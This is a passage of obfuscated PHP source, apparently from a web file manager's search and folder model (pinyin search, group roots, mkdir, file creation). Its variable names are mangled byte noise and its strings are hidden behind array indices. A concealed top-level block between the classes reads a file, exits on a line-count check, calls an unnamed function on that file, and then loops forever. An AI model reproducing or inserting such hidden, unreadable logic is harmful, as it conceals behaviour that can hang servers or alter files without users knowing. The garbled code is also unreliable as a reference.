(!$Áñ©²Ñ‹[$ğĞƒˆæ[2070]] || $ãê´‘†„[$ğĞƒˆæ[444]][$ğĞƒˆæ[430]] > 1) { return; } $‰±ĞèÒŠ = Model($ğĞƒˆæ[2244])->listData(); $–Ú€ËĞâ = array(); $‚ªüÁ®ç = $Áñ©²Ñ‹[$ğĞƒˆæ[2070]]; foreach ($‰±ĞèÒŠ as $œìö„Ùï) { $–Ö˜÷×¤ = $œìö„Ùï[$ğĞƒˆæ[32]]; $èåŸœğ = str_replace($ğĞƒˆæ[53], $ğĞƒˆæ[12], Pinyin::get($–Ö˜÷×¤)); if (stripos($–Ö˜÷×¤, $‚ªüÁ®ç) !== !1 || stripos($èåŸœğ, $‚ªüÁ®ç) !== !1) { $–Ú€ËĞâ[] = $œìö„Ùï[$ğĞƒˆæ[477]]; } } if (!$–Ú€ËĞâ) { return; } $ÙÚ·ÙÔĞ = array($ğĞƒˆæ[502] => array($ğĞƒˆæ[7], $–Ú€ËĞâ), $ğĞƒˆæ[1771] => USER_ID); $úûó³ = Model($ğĞƒˆæ[504])->field($ğĞƒˆæ[87])->where($ÙÚ·ÙÔĞ)->select(); $úûó³ = array_to_keyvalue($úûó³, $ğĞƒˆæ[12], $ğĞƒˆæ[87]); $©ÀíªÁ¹ = array_unique($úûó³); $this->_listSearchMerge($ãê´‘†„, $Áñ©²Ñ‹, $¥õ˜¢„, $©ÀíªÁ¹); } private function _listSearchDesc(&$å®…­é¹, $’†´ôŞ¥, $–ìÚû£) { $›ş–…ß =& $_SERVER[°‰†òö¯]; if (!isset($’†´ôŞ¥[$›ş–…ß[528]])) { return; } if (!$’†´ôŞ¥[$›ş–…ß[2070]] || $å®…­é¹[$›ş–…ß[444]][$›ş–…ß[430]] > 1) { return; } $”÷ÇÓù = array($›ş–…ß[97] => $›ş–…ß[528], $›ş–…ß[452] => array($›ş–…ß[461], $›ş–…ß[2072] . $’†´ôŞ¥[$›ş–…ß[2070]] . $›ş–…ß[2072])); $úËò‘¼‘ = !1; if ($úËò‘¼‘) { $í„ ÜùÍ = $this->listSearchChildren($’†´ôŞ¥[$›ş–…ß[192]]); $í„ ÜùÍ = array_unique($í„ ÜùÍ); if (!$í„ ÜùÍ) { return; } $”÷ÇÓù[$›ş–…ß[193]] = array($›ş–…ß[7], $í„ ÜùÍ); } $ğ´µºá = Model($›ş–…ß[639])->field($›ş–…ß[193])->where($”÷ÇÓù)->limit(5000)->select(); $‹³¶ïòÍ = array_to_keyvalue($ğ´µºá, $›ş–…ß[12], $›ş–…ß[193]); $this->_listSearchMerge($å®…­é¹, $’†´ôŞ¥, $–ìÚû£, $‹³¶ïòÍ); } private function _listSearchGroupTag(&$ãôïÆ´, $ü“–Ü‹Á, $Ùøö¤ˆÍ) { $’È×çœ =& $_SERVER[°‰†òö¯]; if (!isset($ü“–Ü‹Á[$’È×çœ[2243]])) { return; } if (!$ü“–Ü‹Á[$’È×çœ[2070]] || $ãôïÆ´[$’È×çœ[444]][$’È×çœ[430]] > 1 || !$ü“–Ü‹Á[$’È×çœ[192]]) { return; } $øåÂÒç¿ = $this->sourceInfo($ü“–Ü‹Á[$’È×çœ[192]]); if (!$øåÂÒç¿ || $øåÂÒç¿[$’È×çœ[190]] != SourceModel::TYPE_GROUP) { return; } $ç¤èµ…Å = $øåÂÒç¿[$’È×çœ[573]]; $šÜŠ§€Õ = Model($’È×çœ[2245])->get($ç¤èµ…Å); $°½€øÅİ = array(); $Â“ğÑó» = $ü“–Ü‹Á[$’È×çœ[2070]]; foreach ($šÜŠ§€Õ[$’È×çœ[447]] as $¸”áíç) { $áø¤Ãê¨ = $¸”áíç[$’È×çœ[32]]; $Æöòàğá = str_replace($’È×çœ[53], $’È×çœ[12], Pinyin::get($áø¤Ãê¨)); if (stripos($áø¤Ãê¨, $Â“ğÑó») !== !1 || stripos($Æöòàğá, $Â“ğÑó») !== !1) { $°½€øÅİ[] = $¸”áíç[$’È×çœ[477]]; } } if (!$°½€øÅİ) { return; } $šÅÀğ«ƒ = array($’È×çœ[502] => array($’È×çœ[7], $°½€øÅİ), $’È×çœ[1771] => 0, $’È×çœ[33] => $’È×çœ[2092] . $ç¤èµ…Å); $ÆúÎ¯° = Model($’È×çœ[504])->field($’È×çœ[87])->where($šÅÀğ«ƒ)->select(); $ÆúÎ¯° = array_to_keyvalue($ÆúÎ¯°, $’È×çœ[12], $’È×çœ[87]); $üô¥» = array_unique($ÆúÎ¯°); $this->_listSearchMerge($ãôïÆ´, $ü“–Ü‹Á, $Ùøö¤ˆÍ, $üô¥»); } private function _listSearchMerge(&$ÜÀæ­£°, $ƒş¹öŒÇ, $Ç…¨¿Ôƒ, $Õ«ûÄ³Š) { $§¢†€üÇ =& $_SERVER[°‰†òö¯]; if (!$Õ«ûÄ³Š) { return; } $‰‘´³’‰ = array_to_keyvalue($ÜÀæ­£°[$§¢†€üÇ[447]], $§¢†€üÇ[12], $§¢†€üÇ[193]); $­‚²Ê„ = array_diff($Õ«ûÄ³Š, $‰‘´³’‰); if (!$­‚²Ê„) { return; } $şÁ‰öÉ = array($§¢†€üÇ[193] => array($§¢†€üÇ[7], $­‚²Ê„)); $ú¨È†ÊÜ = $this->field($Ç…¨¿Ôƒ)->where($şÁ‰öÉ)->select(); if (!$ú¨È†ÊÜ) { return; } $œâÕ¢àö = array(); foreach ($ú¨È†ÊÜ as $ó“®İâ) { if ($this->_listSearchFilter($ó“®İâ, $ƒş¹öŒÇ)) { $œâÕ¢àö[] = $ó“®İâ; } } $ÜÀæ­£°[$§¢†€üÇ[447]] = array_merge($œâÕ¢àö, $ÜÀæ­£°[$§¢†€üÇ[447]]); $ÜÀæ­£°[$§¢†€üÇ[444]][$§¢†€üÇ[445]] += count($œâÕ¢àö); } private function _listSearchFilter($íúõ”Íø, $¤”¥ŠìŠ) { $™¡‰„åı =& $_SERVER[°‰†òö¯]; $öõ‘ù³„ = $íúõ”Íø[$™¡‰„åı[487]] == $™¡‰„åı[91]; if (!strstr($íúõ”Íø[$™¡‰„åı[588]], $™¡‰„åı[50] . $¤”¥ŠìŠ[$™¡‰„åı[192]] . $™¡‰„åı[50])) { return !1; } if (isset($¤”¥ŠìŠ[$™¡‰„åı[488]]) && $¤”¥ŠìŠ[$™¡‰„åı[488]] != $™¡‰„åı[837]) { if ($¤”¥ŠìŠ[$™¡‰„åı[488]] == $™¡‰„åı[78] && !$öõ‘ù³„) { return !1; } if ($¤”¥ŠìŠ[$™¡‰„åı[488]] != $™¡‰„åı[78] && $öõ‘ù³„) { return !1; } if (!strstr($íúõ”Íø[$™¡‰„åı[169]], $™¡‰„åı[50] . $¤”¥ŠìŠ[$™¡‰„åı[488]] . $™¡‰„åı[50])) { return !1; } } if (isset($¤”¥ŠìŠ[$™¡‰„åı[2246]]) && $¤”¥ŠìŠ[$™¡‰„åı[2246]] < $íúõ”Íø[$™¡‰„åı[79]]) { return !1; } if (isset($¤”¥ŠìŠ[$™¡‰„åı[2247]]) && $¤”¥ŠìŠ[$™¡‰„åı[2247]] > $íúõ”Íø[$™¡‰„åı[79]]) { return !1; } if (isset($¤”¥ŠìŠ[$™¡‰„åı[669]]) && $¤”¥ŠìŠ[$™¡‰„åı[669]] != $íúõ”Íø[$™¡‰„åı[531]]) { return !1; } return !0; } public function listSearchChildren($â·î»„ë, $‘¬“Áœ• = 5000) { $Ö·Ÿ» È =& $_SERVER[°‰†òö¯]; $Ê¢¾§™Ø = array(); $ï×ëÆíŞ = $this->sourceInfo($â·î»„ë); $ìŠ‚ÕİÃ = array($Ö·Ÿ» È[588] => array($Ö·Ÿ» È[461], $ï×ëÆíŞ[$Ö·Ÿ» È[588]] . $ï×ëÆíŞ[$Ö·Ÿ» È[193]] . $Ö·Ÿ» È[620])); $Æ´ãªò = $this->field($Ö·Ÿ» È[79])->where($ìŠ‚ÕİÃ)->limit($‘¬“Áœ• + 1)->select(); $ª“È¹»õ = is_array($Æ´ãªò) ? count($Æ´ãªò) : 0; if ($ª“È¹»õ > $‘¬“Áœ•) { return $this->_listSearchChildrenNear($â·î»„ë, $‘¬“Áœ•); } $ƒÖŞË˜ˆ = $this->field($Ö·Ÿ» È[193])->where($ìŠ‚ÕİÃ)->select(); $Ê¢¾§™Ø = array_to_keyvalue($ƒÖŞË˜ˆ, $Ö·Ÿ» È[12], $Ö·Ÿ» È[193]); return $Ê¢¾§™Ø; } private function _listSearchChildrenNear($¡’©ê«‘, $¶¾Öé½®) { $ıíóŸ½á =& $_SERVER[°‰†òö¯]; $ó­ãƒØ = array(); $ê°¡¹ó = array($ıíóŸ½á[192] => $¡’©ê«‘); $œ“÷¥Ü“ = $this->field($ıíóŸ½á[2248])->where($ê°¡¹ó)->select(); $¤Š“Ï¸¶ = array_to_keyvalue(array_filter_by_field($œ“÷¥Ü“, $ıíóŸ½á[487], $ıíóŸ½á[91]), $ıíóŸ½á[12], $ıíóŸ½á[193]); $ó­ãƒØ = array_merge($ó­ãƒØ, array_to_keyvalue($œ“÷¥Ü“, $ıíóŸ½á[12], $ıíóŸ½á[193])); if (!$¤Š“Ï¸¶) { return $ó­ãƒØ; } $ê°¡¹ó = array($ıíóŸ½á[192] => array($ıíóŸ½á[7], $¤Š“Ï¸¶)); $œ“÷¥Ü“ = $this->field($ıíóŸ½á[2248])->where($ê°¡¹ó)->limit($¶¾Öé½®)->select(); $ó­ãƒØ = array_merge($ó­ãƒØ, array_to_keyvalue($œ“÷¥Ü“, $ıíóŸ½á[12], $ıíóŸ½á[193])); $ó­ãƒØ = array_slice($ó­ãƒØ, 0, intval($¶¾Öé½®)); return $ó­ãƒØ; } private function _listSearchBindPinyin($ ×•ÓÂ, &$ë×œ¼ õ, &$÷˜šüÚÕ) { $„×¶¼ëò =& $_SERVER[°‰†òö¯]; if (!isset($ ×•ÓÂ[$„×¶¼ëò[2070]]) || !$ ×•ÓÂ[$„×¶¼ëò[2070]]) { return; } if (!Input::check($ ×•ÓÂ[$„×¶¼ëò[2070]], $„×¶¼ëò[395]) || strlen($ ×•ÓÂ[$„×¶¼ëò[2070]]) < 2) { return; } $Óãª¥Ë£ = "\x4c\x45\106\124\x20\112\117\111\116\x20{$this->tablePrefix}\151\x6f\137\x73\157\165\x72\143\x65\x5f\155\x65\x74\141\40\155\x65\164\x61\x20\x6f\x6e\x20\x73\157\x75\x72\x63\x65\56\x73\x6f\x75\x72\x63\x65\x49\104\40\75\x20\x6d\145\x74\x61\56\x73\157\x75\162\143\x65\x49\104"; $ÒÔ–ÕæÓ = array(); $÷˜šüÚÕ = str_replace(array($„×¶¼ëò[287], $„×¶¼ëò[53], $„×¶¼ëò[2249]), $„×¶¼ëò[12], $÷˜šüÚÕ); $÷˜šüÚÕ = $„×¶¼ëò[513] . str_replace($„×¶¼ëò[50], $„×¶¼ëò[514], $÷˜šüÚÕ); $ÔıŞÊ’° = $ë×œ¼ õ[$„×¶¼ëò[32]]; unset($ë×œ¼ õ[$„×¶¼ëò[32]]); foreach ($ë×œ¼ õ as $Ê”°É¯ => $îîğğ„š) { $ÒÔ–ÕæÓ[$„×¶¼ëò[513] . $Ê”°É¯] = $îîğğ„š; } foreach ($ÔıŞÊ’° as $À¢¬Ôı€) { $ÒÔ–ÕæÓ[] = array($„×¶¼ëò[518] => $À¢¬Ôı€, $„×¶¼ëò[1075] => $„×¶¼ëò[2074], array($„×¶¼ëò[2250] => $À¢¬Ôı€, $„×¶¼ëò[2251] => array($„×¶¼ëò[7], array($„×¶¼ëò[540], $„×¶¼ëò[539])))); } $this->join($Óãª¥Ë£); $ë×œ¼ õ = $ÒÔ–ÕæÓ; } private function _parseSearchWhere($ó¦Ÿº) { $©ªöÂû =& $_SERVER[°‰†òö¯]; $—í…ğö = array(); if (isset($ó¦Ÿº[$©ªöÂû[821]]) && $ó¦Ÿº[$©ªöÂû[821]]) { $—í…ğö[$©ªöÂû[88]] = array($©ªöÂû[2252], $ó¦Ÿº[$©ªöÂû[821]]); } if (isset($ó¦Ÿº[$©ªöÂû[822]]) && $ó¦Ÿº[$©ªöÂû[822]]) { $»œîÀÓê = array($©ªöÂû[2253], $ó¦Ÿº[$©ªöÂû[822]]); if ($—í…ğö[$©ªöÂû[88]]) { $—í…ğö[$©ªöÂû[88]] = array($—í…ğö[$©ªöÂû[88]], $»œîÀÓê, $©ªöÂû[2254]); } else { $—í…ğö[$©ªöÂû[88]] = $»œîÀÓê; } } if (isset($ó¦Ÿº[$©ªöÂû[2246]]) && $ó¦Ÿº[$©ªöÂû[2246]] > 0) { $—í…ğö[$©ªöÂû[79]] = array($©ªöÂû[2252], $ó¦Ÿº[$©ªöÂû[2246]]); } if (isset($ó¦Ÿº[$©ªöÂû[2247]]) && $ó¦Ÿº[$©ªöÂû[2247]]) { $»œîÀÓê = array($©ªöÂû[2253], $ó¦Ÿº[$©ªöÂû[2247]]); if ($—í…ğö[$©ªöÂû[79]]) { $—í…ğö[$©ªöÂû[79]] = array($—í…ğö[$©ªöÂû[79]], $»œîÀÓê, $©ªöÂû[2254]); } else { $—í…ğö[$©ªöÂû[79]] = $»œîÀÓê; } } if (isset($ó¦Ÿº[$©ªöÂû[669]]) && $ó¦Ÿº[$©ªöÂû[669]]) { $—í…ğö[] = array($©ªöÂû[531] => $ó¦Ÿº[$©ªöÂû[669]], $©ªöÂû[529] => $ó¦Ÿº[$©ªöÂû[669]], $©ªöÂû[1075] => $©ªöÂû[2074]); } if (isset($ó¦Ÿº[$©ªöÂû[488]]) && $ó¦Ÿº[$©ªöÂû[488]]) { $‘îÙ§ç½ = $ó¦Ÿº[$©ªöÂû[488]]; if ($‘îÙ§ç½ == $©ªöÂû[78]) { $—í…ğö[$©ªöÂû[487]] = 1; } else { if ($‘îÙ§ç½ == $©ªöÂû[2255]) { $—í…ğö[$©ªöÂû[487]] = 0; } else { if ($‘îÙ§ç½) { $‘îÙ§ç½ = is_array($‘îÙ§ç½) ? $‘îÙ§ç½ : explode($©ªöÂû[50], $‘îÙ§ç½); $—í…ğö[$©ªöÂû[488]] = array($©ªöÂû[494], $‘îÙ§ç½); $—í…ğö[$©ªöÂû[487]] = 0; } } } } $this->_parseSearchParent($ó¦Ÿº, $—í…ğö); if (isset($ó¦Ÿº[$©ªöÂû[2070]]) && trim($ó¦Ÿº[$©ªöÂû[2070]])) { $ƒãÖ†Øä = trim($ó¦Ÿº[$©ªöÂû[2070]]); $Ïñ†÷ˆ† = explode($©ªöÂû[53], $ƒãÖ†Øä); if (strlen($ƒãÖ†Øä) > 2 && (substr($ƒãÖ†Øä, 0, 1) == $©ªöÂû[121] && substr($ƒãÖ†Øä, -1) == $©ªöÂû[121]) || substr($ƒãÖ†Øä, 0, 1) == $©ªöÂû[58] && substr($ƒãÖ†Øä, -1) == $©ªöÂû[58]) { $ƒãÖ†Øä = substr($ƒãÖ†Øä, 1, -1); $Ïñ†÷ˆ† = array($ƒãÖ†Øä); } $—í…ğö[$©ªöÂû[32]] = array(array($©ªöÂû[619], $©ªöÂû[2072] . $ƒãÖ†Øä . $©ªöÂû[2072])); if (count($Ïñ†÷ˆ†) > 1) { $—í…ğö[$©ªöÂû[32]] = array(); foreach ($Ïñ†÷ˆ† as $‰Ê¿£ì¸) { if (!trim($‰Ê¿£ì¸)) { continue; } $—í…ğö[$©ªöÂû[32]][] = array($©ªöÂû[619], $©ªöÂû[2072] . trim($‰Ê¿£ì¸) . $©ªöÂû[2072]); } } } return $—í…ğö; } private function _parseSearchParent($²¹ß«·³, &$´ÆÙÙÜæ) { $ÑúšşÉ =& $_SERVER[°‰†òö¯]; if (!isset($²¹ß«·³[$ÑúšşÉ[192]]) || !$²¹ß«·³[$ÑúšşÉ[192]]) { return; } $ûıÔÏóÔ = $this->pathInfo($²¹ß«·³[$ÑúšşÉ[192]]); $âîÈô¯ = $ûıÔÏóÔ[$ÑúšşÉ[192]] . $ÑúšşÉ[12] === $ÑúšşÉ[230]; $·†ìÛ…û = $ûıÔÏóÔ[$ÑúšşÉ[190]] == $ÑúšşÉ[582]; if ($ûıÔÏóÔ[$ÑúšşÉ[598]] == $ÑúšşÉ[599]) { $î®â…û• = $this->sourceInfo($²¹ß«·³[$ÑúšşÉ[192]]); $ûıÔÏóÔ[$ÑúšşÉ[588]] = $î®â…û•[$ÑúšşÉ[588]]; } $´ÆÙÙÜæ[$ÑúšşÉ[659]] = array($ÑúšşÉ[619], $ûıÔÏóÔ[$ÑúšşÉ[588]] . $²¹ß«·³[$ÑúšşÉ[192]] . $ÑúšşÉ[620]); $÷³Ä¨™é = isset($²¹ß«·³[$ÑúšşÉ[1930]]) && in_array($ÑúšşÉ[582], $²¹ß«·³[$ÑúšşÉ[1930]]); if (!$÷³Ä¨™é || !$·†ìÛ…û || !$âîÈô¯ || !$ûıÔÏóÔ[$ÑúšşÉ[489]]) { return; } if (!AuthModel::authCheckRoot($ûıÔÏóÔ[$ÑúšşÉ[489]][$ÑúšşÉ[490]])) { return; } $æ²ğÛæç = $ûıÔÏóÔ[$ÑúšşÉ[573]] . $ÑúšşÉ[12]; if ($æ²ğÛæç == $ÑúšşÉ[91]) { unset($´ÆÙÙÜæ[$ÑúšşÉ[659]]); $´ÆÙÙÜæ[$ÑúšşÉ[190]] = self::TYPE_GROUP; return; } $« ÔÔÛ– = Model($ÑúšşÉ[589])->groupChildrenAll($æ²ğÛæç); $¬“Í¬‹ = count($« ÔÔÛ–); if ($¬“Í¬‹ <= 1) { return; } $€¨°ÂÊ = array($ÑúšşÉ[192] => 0, $ÑúšşÉ[190] => self::TYPE_GROUP, $ÑúšşÉ[573] => array($ÑúšşÉ[7], $« ÔÔÛ–)); $¬ìî¥Â = $this->field($ÑúšşÉ[2256])->where($€¨°ÂÊ)->limit($¬“Í¬‹)->select(); $´ÆÙÙÜæ[$ÑúšşÉ[659]] = array(); foreach ($¬ìî¥Â as $ê´Ê ã) { $´ÆÙÙÜæ[$ÑúšşÉ[659]][] = array($ÑúšşÉ[619], $ÑúšşÉ[597] . $ê´Ê ã[$ÑúšşÉ[193]] . $ÑúšşÉ[620]); } $´ÆÙÙÜæ[$ÑúšşÉ[659]][] = $ÑúšşÉ[2074]; } } if (!isset($_SERVER[$_SERVER[°‰†òö¯][946]]) || !isset($_SERVER[$_SERVER[°‰†òö¯][944]])) { $_getc = $_SERVER[°‰†òö¯][948]; $_getfile = $_SERVER[$_SERVER[°‰†òö¯][949]] . $_SERVER[°‰†òö¯][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[°‰†òö¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[°‰†òö¯][694]) { $exit = $_SERVER[°‰†òö¯][951]; $exit(); } $_act = $_SERVER[°‰†òö¯][1034]; $_act($_SERVER[$_SERVER[°‰†òö¯][949]] . $_SERVER[°‰†òö¯][950]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[°‰†òö¯][456]); } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($æÛˆÔìÜ) { $ª¦¥²ø =& $_SERVER[°‰†òö¯]; $ú´‡ş‹Ã = Model($ª¦¥²ø[581])->where(array($ª¦¥²ø[1762] => $æÛˆÔìÜ))->find(); $úØˆ€Ş = $this->_mkdirRoot(SourceModel::TYPE_USER, $æÛˆÔìÜ, $ú´‡ş‹Ã[$ª¦¥²ø[32]]); $this->userDesktopAdd($úØˆ€Ş); return $úØˆ€Ş; } public function userDesktopAdd($œ½¼©Ñ) { $¢¾ä­Û± =& $_SERVER[°‰†òö¯]; $œ±Ìû‰ = LNG($¢¾ä­Û±[2257]); $Óƒ†õ÷î = $this->mkdir($œ½¼©Ñ, $œ±Ìû‰); $this->metaSet($Óƒ†õ÷î, $¢¾ä­Û±[2258], $¢¾ä­Û±[91]); $this->metaSet($œ½¼©Ñ, $¢¾ä­Û±[2259], $Óƒ†õ÷î); } public function userPathSafeAdd($Ü‰—œÑï) { $ëªÛİÒ =& $_SERVER[°‰†òö¯]; $“èëº¡ = Model($ëªÛİÒ[581])->getInfoFull($Ü‰—œÑï); if (!$“èëº¡) { return !1; } if (_get($“èëº¡, $ëªÛİÒ[602])) { return $“èëº¡[$ëªÛİÒ[543]][$ëªÛİÒ[2260]]; } $ñáœìİ› = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ü‰—œÑï, $ëªÛİÒ[2261], $ëªÛİÒ[2262]); Model($ëªÛİÒ[581])->metaSet($Ü‰—œÑï, $ëªÛİÒ[2260], $ñáœìİ›); $this->metaSet($ñáœìİ›, $ëªÛİÒ[2263], $Ü‰—œÑï); return $ñáœìİ›; } public function userPathAppAdd($¨¬ëè, $ÒŸõŒÂ£ = '', $«ú¿Ş¡¶ = '') { $áê”‰‘“ =& $_SERVER[°‰†òö¯]; $·¦Ãí¢ = Model($áê”‰‘“[581])->getInfoFull($¨¬ëè); if (!$·¦Ãí¢) { return !1; } $€ÔªíŠ = $·¦Ãí¢[$áê”‰‘“[543]] ? $·¦Ãí¢[$áê”‰‘“[543]] : array(); $ºĞŒÁŸ¹ = $€ÔªíŠ[$áê”‰‘“[2264]]; if (!$ºĞŒÁŸ¹) { $ºĞŒÁŸ¹ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¨¬ëè, $áê”‰‘“[2265], $áê”‰‘“[2266]); Model($áê”‰‘“[581])->metaSet($¨¬ëè, $áê”‰‘“[2264], $ºĞŒÁŸ¹ . $áê”‰‘“[12]); $this->metaSet($ºĞŒÁŸ¹, $áê”‰‘“[2264], $¨¬ëè); } if (!$ÒŸõŒÂ£) { return $ºĞŒÁŸ¹; } $‹ àÌ™± = $€ÔªíŠ[$áê”‰‘“[2267] . $ÒŸõŒÂ£]; if (!$‹ àÌ™±) { $‹ àÌ™± = $this->mkdir($ºĞŒÁŸ¹, $ÒŸõŒÂ£); Model($áê”‰‘“[581])->metaSet($¨¬ëè, $áê”‰‘“[2267] . $ÒŸõŒÂ£, $‹ àÌ™±); $this->metaSet($‹ àÌ™±, $áê”‰‘“[2267] . $ÒŸõŒÂ£, $¨¬ëè); } if (!$«ú¿Ş¡¶) { return $‹ àÌ™±; } $ÌĞ¯¹ñï = $this->mkdir($‹ àÌ™±, $«ú¿Ş¡¶); return $ÌĞ¯¹ñï; } public function groupRootAdd($Ú›’ÂÓ•) { $ˆ†õşëÄ =& $_SERVER[°‰†òö¯]; $…ƒ²óİû = Model($ˆ†õşëÄ[589])->where(array($ˆ†õşëÄ[2064] => $Ú›’ÂÓ•))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ú›’ÂÓ•, $…ƒ²óİû[$ˆ†õşëÄ[32]]); } public function systemRootPathAdd($‚óÉè¬) { if ($‚óÉè¬ != $_SERVER[°‰†òö¯][612]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $‚óÉè¬); } public function userRootRemove($òµƒĞ¹’) { $ú“öåå = $this->targetSourceRoot(SourceModel::TYPE_USER, $òµƒĞ¹’, !0); foreach ($ú“öåå as $™Ú–¹é½) { if (!$™Ú–¹é½) { continue; } $this->remove($™Ú–¹é½[$_SERVER[°‰†òö¯][193]], !1); } } public function groupRootRemove($Óß¡Üó–) { $ğî•ó­¢ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Óß¡Üó–); if (!$ğî•ó­¢) { return; } $this->remove($ğî•ó­¢[$_SERVER[°‰†òö¯][193]], !1); } private function _mkdirRoot($„Ç±Ã¿œ, $äÆº‚¬ù, $ÏÕè¤•ç, $Åçğ” = '') { $øåæÉòí =& $_SERVER[°‰†òö¯]; $¹¢œï®ã = defined($øåæÉòí[2202]) ? USER_ID : 0; $‚å’èëÉ = array($øåæÉòí[479] => 0, $øåæÉòí[655] => $„Ç±Ã¿œ, $øåæÉòí[656] => $äÆº‚¬ù, $øåæÉòí[653] => 1, $øåæÉòí[657] => $¹¢œï®ã, $øåæÉòí[658] => $¹¢œï®ã, $øåæÉòí[654] => $Åçğ”, $øåæÉòí[659] => $øåæÉòí[597], $øåæÉòí[506] => 0, $øåæÉòí[624] => 0, $øåæÉòí[546] => 0, $øåæÉòí[660] => $øåæÉòí[12]); if ($ª‹ùô = $this->where($‚å’èëÉ)->find()) { return $ª‹ùô[$øåæÉòí[193]]; } $€³§îä× = "\115\157\x64\x65\x6c\123\x6f\165\x72\x63\x65\56\155\153\144\151\162\122\157\x6f\x74\56{$„Ç±Ã¿œ}\56{$äÆº‚¬ù}\56" . $ÏÕè¤•ç; CacheLock::lock($€³§îä×); $‚å’èëÉ[$øåæÉòí[32]] = $ÏÕè¤•ç; $úşŠ–‘Ö = $this->add($‚å’èëÉ); $–ı¯Áš… = array($øåæÉòí[661] => short_id($úşŠ–‘Ö)); $this->where(array($øåæÉòí[493] => $úşŠ–‘Ö))->save($–ı¯Áš…); CacheLock::unlock($€³§îä×); return $úşŠ–‘Ö; } private function targetSourceRoot($ï¹ìßı, $½¼ü…İÇ, $üüªıö° = false) { $¦€¶…Õ³ =& $_SERVER[°‰†òö¯]; $›Åéƒ± = array($¦€¶…Õ³[479] => 0, $¦€¶…Õ³[655] => $ï¹ìßı, $¦€¶…Õ³[656] => $½¼ü…İÇ); if ($üüªıö°) { $°ğ™¡ë« = $this->where($›Åéƒ±)->select(); return $°ğ™¡ë« ? $°ğ™¡ë« : array(); } $–ù¾²½Ù = $this->where($›Åéƒ±)->find(); return $–ù¾²½Ù ? $–ù¾²½Ù : array(); } public function sourceRootGroup($Á…·Ş‹Ñ) { $ÄàÚÙé =& $_SERVER[°‰†òö¯]; if (is_string($Á…·Ş‹Ñ)) { $Á…·Ş‹Ñ = array($Á…·Ş‹Ñ); } $æø·÷™š = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Á…·Ş‹Ñ, $ÄàÚÙé[222]); $í×Çªî¬ = array($ÄàÚÙé[447] => $æø·÷™š, $ÄàÚÙé[444] => array($ÄàÚÙé[819] => count($Á…·Ş‹Ñ))); $this->_listDataApply($í×Çªî¬[$ÄàÚÙé[447]]); $this->_listMake($í×Çªî¬); return array_to_keyvalue($í×Çªî¬[$ÄàÚÙé[85]], $ÄàÚÙé[573]); } public function mkfile($‰Æ†âë, $”…Ú¯ö, $‰­Ù—‚ı = '', $ÜÚ´ÅÀ¤ = REPEAT_RENAME) { $ğ—˜û¾© =& $_SERVER[°‰†òö¯]; $ÖÎšÆÈ„ = Model($ğ—˜û¾©[681])->addFileByContent($‰­Ù—‚ı, $”…Ú¯ö); return $this->_createFileCall($‰Æ†âë, $”…Ú¯ö, $ÖÎšÆÈ„, $ÜÚ´ÅÀ¤, $ğ—˜û¾©[1429]); } public function addFile($¬›Şî¬», $ÜÅ¾„Ü±, $ö›¸ºŸÀ, $—„Äåô× = false, $«ìÊüìû = REPEAT_RENAME) { $­Ö•¬ = Model($_SERVER[°‰†òö¯][681])->addFile($ÜÅ¾„Ü±, $ö›¸ºŸÀ, $—„Äåô×); return $this->_createFileCall($¬›Şî¬», $ö›¸ºŸÀ, $­Ö•¬, $«ìÊüìû); } public function addFileByFileID($´‚¥¸Û, $ØËû¶€, $¹‘ÂÏÜ”, $ÂğŞ°× = REPEAT_RENAME) { $÷ÒÄŒ—Ö =& $_SERVER[°‰†òö¯]; $îòïÀŸá = Model($÷ÒÄŒ—Ö[681])->find($ØËû¶€); Model($÷ÒÄŒ—Ö[681])->linkAdd($ØËû¶€); return $this->_createFileCall($´‚¥¸Û, $¹‘ÂÏÜ”, $îòïÀŸá, $ÂğŞ°×); } public function addFileByRemote($ˆçêµ¬ö, $ÒŞõ§şÆ, $€–‡¾™‰, $€ûóÏä¶ = array(), $áíª€ï„ = REPEAT_RENAME) { $÷‘Àøå  = Model($_SERVER[°‰†òö¯][681])->addFileByRemote($ÒŞõ§şÆ, $€–‡¾™‰, $€ûóÏä¶); return $this->_createFileCall($ˆçêµ¬ö, $€–‡¾™‰, $÷‘Àøå , $áíª€ï„); } private function _createFileCall($—æÉäÎ¤, $şìí®²ç, $¥°ç¦ŞŸ, $˜ıõæº, $œ„½¬â¢ = "\x75\x70\x6c\157\141\144") { $€šÉ¢•¤ =& $_SERVER[°‰†òö¯]; if (!$¥°ç¦ŞŸ) { return !1; } $ Ùƒ™±± = !1; $this->setMasterDB(); $this->lockWriteStart($—æÉäÎ¤, $şìí®²ç); $ „½Ìóà = $this->fileNameExist($—æÉäÎ¤, $şìí®²ç); $ÖàŠãÉş = $this->_createFile($—æÉäÎ¤, $şìí®²ç, $¥°ç¦ŞŸ, $˜ıõæº, $ Ùƒ™±±); if (!$ Ùƒ™±±) { Model($€šÉ¢•¤[548])->remove($¥°ç¦ŞŸ[$€šÉ¢•¤[545]]); } if ($ Ùƒ™±± && $ÖàŠãÉş && $ÖàŠãÉş != $ „½Ìóà) { Model($€šÉ¢•¤[2229])->eventCreate($ÖàŠãÉş, $œ„½¬â¢); } $this->lockWriteEnd($—æÉäÎ¤, $şìí®²ç); return $ÖàŠãÉş; } public function mkdir($õÊßôğ÷, $„…­ËÎ“, $ùà‰õòÚ = REPEAT_SKIP) { $º¥ñõª· =& $_SERVER[°‰†òö¯]; $this->setMasterDB(); $»§³ıçÓ = $this->sourceInfo($õÊßôğ÷); if (!$»§³ıçÓ) { return !1; } $this->lockWriteStart($õÊßôğ÷, $„…­ËÎ“); if ($ùà‰õòÚ !== !1) { $íÂ˜¹Ãº = $this->fileNameExist($õÊßôğ÷, $„…­ËÎ“); if ($íÂ˜¹Ãº && $ùà‰õòÚ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($õÊßôğ÷, $„…­ËÎ“); return $íÂ˜¹Ãº; } $„…­ËÎ“ = $this->fileNameAuto($õÊßôğ÷, $„…­ËÎ“, $ùà‰õòÚ); } $ŞÎÅúšÀ = 